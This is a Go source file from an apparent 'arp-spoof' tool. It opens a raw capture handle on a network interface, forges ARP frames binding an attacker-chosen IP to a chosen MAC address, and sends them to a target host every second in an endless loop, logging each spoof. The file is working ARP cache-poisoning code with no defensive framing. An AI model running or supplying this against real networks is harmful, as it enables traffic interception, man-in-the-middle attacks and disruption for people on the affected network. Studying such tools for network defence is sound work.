package arp

import (
	"fmt"
	"github.com/google/gopacket/pcap"
	marp "github.com/mdlayher/arp"
	"github.com/mdlayher/ethernet"
	"github.com/papr8ka/arp-spoof/logger"
	"github.com/papr8ka/arp-spoof/logger/label"
	"go.uber.org/zap"
	"net"
	"strings"
	"sync"
	"time"
)

type implementation struct {
	handle        *pcap.Handle
	interfaceName string

	sync.RWMutex

	targetMACString string
	targetMAC       net.HardwareAddr

	spoofedIPString string
	spoofedIP       net.IP

	spoofedMACString string
	spoofedMAC       net.HardwareAddr

	frame []byte
}

func New(interfaceName string) (Arp, error) {
	if handle, err := pcap.OpenLive(interfaceName, 65535, true, pcap.BlockForever); err == nil {
		return &implementation{
			handle:        handle,
			interfaceName: interfaceName,
		}, nil
	} else {
		return nil, err
	}
}

func (arp *implementation) GetSpoofedIP() string {
	arp.RLock()
	defer arp.RUnlock()
	return arp.spoofedIPString
}

func (arp *implementation) GetSpoofedMAC() string {
	arp.RLock()
	defer arp.RUnlock()
	return arp.spoofedMACString
}

func (arp *implementation) GetTargetMAC() string {
	arp.RLock()
	defer arp.RUnlock()
	return arp.targetMACString
}

func (arp *implementation) SetParameter(targetMACString string,
	spoofedIPString string,
	spoofedMACString string) error {
	arp.Lock()
	defer arp.Unlock()

	targetMACString = strings.ToLower(targetMACString)
	spoofedMACString = strings.ToLower(spoofedMACString)

	if targetMAC, err := net.ParseMAC(targetMACString); err == nil {
		if spoofedIP := net.ParseIP(spoofedIPString); spoofedIP != nil {
			if spoofMAC, err := net.ParseMAC(spoofedMACString); err == nil {
				arp.targetMACString = targetMACString
				arp.targetMAC = targetMAC
				arp.spoofedMACString = spoofedMACString
				arp.spoofedMAC = spoofMAC
				arp.spoofedIPString = spoofedIPString
				arp.spoofedIP = spoofedIP

				if localFrame, err := arp.buildFrame(); err == nil {
					arp.frame = localFrame
					return nil
				} else {
					return err
				}
			} else {
				return err
			}
		} else {
			return InvalidIPErr
		}
	} else {
		return err
	}
}

func (arp *implementation) Close() {
	arp.handle.Close()
}

func (arp *implementation) buildFrame() ([]byte, error) {
	if arpPacket, err := marp.NewPacket(marp.OperationRequest, arp.spoofedMAC, arp.spoofedIP, arp.spoofedMAC, arp.spoofedIP); err == nil {
		if arpPacketBinary, err := arpPacket.MarshalBinary(); err == nil {
			ethernetFrame := &ethernet.Frame{
				Destination: arp.targetMAC,
				Source:      arpPacket.SenderHardwareAddr,
				EtherType:   ethernet.EtherTypeARP,
				Payload:     arpPacketBinary,
			}

			return ethernetFrame.MarshalBinary()
		} else {
			return nil, err
		}
	} else {
		return nil, err
	}
}

func (arp *implementation) Do() error {
	for {
		arp.RLock()
		if arp.frame == nil {
			logger.Logger.Info("no frame prepared")
		} else {
			if err := arp.handle.WritePacketData(arp.frame); err == nil {
				logger.Logger.Info("spoofed MAC",
					zap.String(label.TargetMAC, arp.targetMACString),
					zap.String(label.SpoofedMAC, arp.spoofedMACString),
					zap.String(label.SpoofedIP, arp.spoofedIPString))
			} else {
				logger.Logger.Error("could not spoof MAC",
					zap.Error(err),
					zap.String(label.TargetMAC, arp.targetMACString),
					zap.String(label.SpoofedMAC, arp.spoofedMACString),
					zap.String(label.SpoofedIP, arp.spoofedIPString))
			}
		}
		arp.RUnlock()

		time.Sleep(time.Second)
	}
}

func (arp *implementation) ListInterfaces() {
	interfaces, _ := pcap.FindAllDevs()
	for _, currentInterface := range interfaces {
		fmt.Print("\"", currentInterface.Name, "\" with human readable name ", currentInterface.Description, " has IP addresses ")
		for _, address := range currentInterface.Addresses {
			cidr, _ := address.Netmask.Size()
			fmt.Print(address.IP, "/", cidr, ", ")
		}
		fmt.Println()
	}
}
